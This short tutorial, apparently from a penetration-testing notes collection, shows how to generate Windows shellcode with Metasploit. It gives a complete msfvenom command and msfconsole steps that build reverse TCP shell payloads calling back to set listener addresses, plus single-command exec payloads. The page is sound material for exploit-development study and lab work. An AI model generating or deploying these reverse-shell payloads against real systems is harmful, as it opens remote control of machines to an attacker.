# Generating Shellcode

An easy way to generate shellcode is by using `msfvenom` or `msconsole`. I mostly see people recommending msfvenom online, but I think msfconsole can be a bit easier to work with. But of course it is the same thing, just different interfaces.

## Msfvenom

### Reverse Bind Shell \(Windows x86\)

```text
msfvenom -p windows/shell_reverse_tcp LHOST=10.20.20.145 LPORT=4444 EXITFUNC=thread -f python -a x86 –platform windows -b “\x00”
```



## Using Msfconsole

In msfconsole you have the keyword `generate` that help us generate shellcode. So first we have to select a payload.

```text
use payload/windows/shell_reverse_tcp
```

Now we set the variables as usual

```text
set LPORT 5555
set LHOST 192.168.0.101
```

Now we generate the shellcode using the command `generate`.

To see the options use `generate -h`

## Command Execution Shellcode

If you don't have much space on the stack and only want to execute a single command you can use:

```text
use payload/windows/exec
use payload/cmd/windows/generic
```
